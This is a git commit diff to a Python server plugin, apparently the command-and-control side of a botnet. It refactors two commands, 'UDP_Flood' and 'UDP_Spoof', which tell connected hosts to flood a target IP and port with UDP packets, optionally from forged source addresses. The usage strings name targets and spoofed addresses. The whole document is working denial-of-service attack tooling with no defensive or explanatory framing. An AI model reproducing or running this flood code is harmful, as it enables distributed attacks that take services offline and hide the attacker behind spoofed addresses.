b84abde92f43c911258438d7e84b5b2006b2fdab
Kolokotronis Panagiotis <panos122008@gmail.com>
2016-08-19 14:21:50 +0300

    Update udp.py
    Added states and state transition.
    Re-introduced dictionary-based command resolution.

--- Server/Plugins/udp.py
+++ Server/Plugins/udp.py
@@ -5,11 +5,13 @@ class Files(Plugin):
     __host_commands__ = {}
 
     def __init__(self):
-        self.__host_commands__["UDP_Flood"] = self.udp_flood
-        self.__host_commands__["UDP_Spoof"] = self.udp_spoof
+        self.__host_commands__["UDP_Flood"] = [self.udp_flood, "connected",
+                                               "multiple"]
+        self.__host_commands__["UDP_Spoof"] = [self.udp_spoof, "connected",
+                                               "multiple"]
 
     def udp_flood(self, host, args):
-        """Floods target machine with UDP packets"""
+        """Flood target machine with UDP packets"""
         if len(args) < 2:
             print("Usage: UDP_Flood <target_ip> <target_port> [payload]")
 
@@ -19,12 +21,13 @@ class Files(Plugin):
         except IndexError:
             cmd = "%s:%s:Hi" % (args[0], args[1])
 
-        host.send("00005")
+        host.send(host.command_dict['udpFlood'])
         host.send("%03d" % len(cmd))
         host.send(cmd)
+        return None
 
     def udp_spoof(self, host, args):
-        """Floods target machine with UDP packets via spoofed ip & port"""
+        """Flood target machine with UDP packets via spoofed ip & port"""
         if len(args) < 4:
             print("Usage: UDP_Spoof <target_ip> <target_port> <spoofed_ip> <spoofed_port> [payload]")
 
@@ -34,6 +37,7 @@ class Files(Plugin):
         except IndexError:
             cmd = "%s:%s:%s:%s:Hi" % (args[0], args[1], args[2], args[3])
 
-        host.send("00006")
+        host.send(host.command_dict['udpSpoof'])
         host.send("%03d" % len(cmd))
         host.send(cmd)
+        return None
